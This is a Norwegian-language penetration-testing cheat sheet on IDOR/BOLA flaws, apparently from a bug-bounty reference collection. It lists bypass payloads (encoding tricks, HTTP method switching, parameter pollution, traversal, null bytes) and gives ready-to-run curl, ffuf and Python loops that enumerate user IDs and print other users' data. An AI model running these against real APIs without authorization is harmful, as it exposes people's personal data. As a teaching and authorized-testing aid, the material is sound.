# 🔓 IDOR – Insecure Direct Object Reference

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Usikker direkte objektreferanse
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

> **Begreper og presisering:** IDOR/BOLA skyldes manglende autorisasjon på det aktuelle objektet; en gjettbar ID alene er ikke en sårbarhet. En 200-respons, et e-postfelt eller endret UI er ikke alene bevis på tilgang til en annen brukers data. Kontroller eierskap og faktiske lese-/skrivehandlinger; se [OWASPs IDOR-veiledning](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html). UUID- og encoding-varianter avhenger av parseren. Base64-eksemplene er skjematiske: echo legger normalt til linjeskift, og piltekstene er ikke shellkommandoer. Den korte IDOR/BOLA-tabellen har en ufullstendig rad i originalen; innholdet er beholdt.

---

## 📋 Innholdsfortegnelse

- [Hva er IDOR](#-hva-er-idor)
- [Hvor du bør lete](#-hvor-du-bør-lete)
- [ID-typer og endringer](#-id-typer-og-endringer)
- [Omgåelsesteknikker](#-omgåelsesteknikker)
- [Testmetodikk](#-testmetodikk)
- [Verktøy og automatisering](#-verktøy-og-automatisering)

---

## 🎯 Hva er IDOR

**IDOR** oppstår når en applikasjon eksponerer direkte referanser til interne objekter (databaseoppføringer, filer osv.) uten tilstrekkelig autorisasjonskontroll.

### Konsekvens
- 🔴 **Datatyveri** – få tilgang til andre brukeres data
- 🔴 **Rettighetseskalering** – få tilgang til administratorfunksjoner
- 🔴 **Kontoovertakelse** – endre andre kontoer
- 🔴 **Datamanipulering** – slett eller endre oppføringer

### IDOR sammenlignet med BOLA
| IDOR | BOLA |
|------|------|
| Tradisjonelt begrep | Begrep innen API-sikkerhet |
| Mangelfull autorisasjon på objektnivå |

---

## 🔍 Hvor du bør lete

### URL-parametere
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

### POST-/PUT-kropp
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

### Headere
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

### Vanlige parametere
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

### Vanlige endepunkter
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

## 🔢 ID-typer og endringer

### Sekvensielle ID-er
```
# Vanlig variant – øk eller reduser verdien
/api/users/1
/api/users/2
/api/users/3

# Test grenseverdier
/api/users/0
/api/users/-1
/api/users/9999999
```

### UUIDs
```
# Undersøk om verdiene faktisk er tilfeldige
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # Øk den siste delen

# Se etter mønstre
# Tidsbaserte UUID-er (v1) – mer forutsigbare
# Tilfeldige UUID-er (v4) – vanskeligere å gjette
```

### Kodede ID-er
```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# Test kodede verdier
/api/users/MTIz  → dekodet = 123
/api/users/MTI0  → dekodet = 124

# Heksadesimal koding
123 → 7b
124 → 7c
```

### Hashede ID-er
```
# MD5 av ID
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# Prøv forskjellige algoritmer
# Undersøk om hashen er ID-basert eller tilfeldig
```

### Egendefinerte formater
```
# ID-er med prefiks
/user/USR_123
/order/ORD_456
/doc/DOC_789

# Tidsstempelbasert
/file/20240128_001
/file/20240128_002
```

---

<a id="-omgåelsesteknikker"></a>
## 🛡️ Omgåelsesteknikker

### Endring av parametere
```bash
# Opprinnelig
GET /api/users/123

# Varianter
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

### Endring av HTTP-metode
```bash
# Hvis GET blokkeres, prøv andre metoder
GET /api/users/124     → Blokkert
POST /api/users/124    → Tillatt?
PUT /api/users/124     → Tillatt?
```

### Pakk inn i tabeller eller objekter
```json
// Hvis id=124 blokkeres, prøv:
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

### Omgåelse med koding
```
# URL-kod
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# Dobbel koding
/api/users/%2531%2532%2534  → 124

# Unicode
/api/users/１２４  → 124 med fullbreddetegn
```

### Endring av store og små bokstaver
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

### Kombinasjon med katalogtraversering
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

### Nullbyte
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

### Injeksjon i JSON-parametere
```json
// Opprinnelig forespørsel
{"user_id": 123, "action": "view"}

// Angrep
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

### HPP (HTTP Parameter Pollution, parameterforurensning)
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

## 📋 Testmetodikk

### Trinn 1: Identifiser
```
1. Kartlegg alle endepunkter med objektreferanser
2. Noter alle parametere som ser ut som ID-er
3. Opprett to testkontoer (User A & User B)
```

### Trinn 2: Kartlegg
```
1. Noter ID-ene dine som User A
2. Noter ID-ene dine som User B
3. Identifiser mønstre i ID-ene
```

### Trinn 3: Test
```
1. Prøv å få tilgang til objektene til User B som User A
2. Test alle CRUD-operasjoner:
   - Les (GET)
   - Opprett (POST)
   - Oppdater (PUT/PATCH)
   - Slett (DELETE)
```

### Trinn 4: Eskaler
```
1. Prøv administrator-ID-er (ofte 1, admin, 0)
2. Prøv spesialverdier (null, undefined, *)
3. Kombiner med andre sårbarheter
```

### Sjekkliste
```markdown
- [ ] URL-parametere
- [ ] Parametere i POST-kroppen
- [ ] Headere (informasjonskapsler og egendefinerte)
- [ ] Skjulte skjemafelt
- [ ] API-endepunkter
- [ ] Filnedlastinger
- [ ] Eksportfunksjoner
- [ ] Slettefunksjoner
- [ ] Administratorfunksjoner
```

---

<a id="-verktøy-og-automatisering"></a>
## 🛠️ Verktøy og automatisering

### Utvidelser til Burp Suite
```
- Autorize (automatisk IDOR-gjenkjenning)
- AuthMatrix
- Auto Repeater
```

### Oppsett av Autorize
```
1. Installer Autorize-utvidelsen
2. Kopier øktinformasjonskapselen fra User B
3. Legg den inn i Autorize
4. Utforsk som User A
5. Autorize tester med økten til User B
```

### Manuell testing med curl
```bash
# Token for User A
TOKEN_A="user_a_jwt_token"

# Prøv ressursen til User B
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# Gå gjennom ID-er i en løkke
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

### ffuf for IDOR
```bash
# Numeriske ID-er
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# Med en ordliste
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

### Python-skript
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

## 📊 Hurtigreferanse

### Vanlige sårbare funksjoner
| Funksjon | Risiko |
|----------|------|
| Vis profil | Datalekkasje |
| Last ned fil | Filtilgang |
| Slett element | Datatap |
| Oppdater innstillinger | Kontoovertakelse |
| Vis bestillinger | Personvernbrudd |
| Eksporter data | Massetyveri av data |

### Hva rapporten bør inneholde
```markdown
## IDOR i brukerprofil

**Endepunkt:** GET /api/users/{id}

**Trinn:**
1. Logg inn som User A (ID: 123)
2. Send GET /api/users/124
3. Observer at dataene til User B returneres

**Konsekvens:** Enhver autentisert bruker kan få tilgang til
alle andre brukeres personopplysninger.

**PoC:**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

## 💡 Praktiske tips

1. **Bruk to kontoer** – test alltid med 2 kontoer
2. **Kontroller alle metoder** – GET, POST, PUT, DELETE
3. **Let overalt** – URL-er, kropp, headere og informasjonskapsler
4. **Prøv grenseverdier** – 0, -1, null, undefined
5. **Kombiner angrep** – IDOR + CSRF, IDOR + XSS
6. **Kontroller eksport** – PDF- og CSV-eksport kan være sårbar
7. **Mobil-API-er** – kan ha svakere kontroll enn webgrensesnittet

---

## 📚 Ressurser

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [PortSwigger Access Control](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 Finn IDOR-sårbarhetene!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
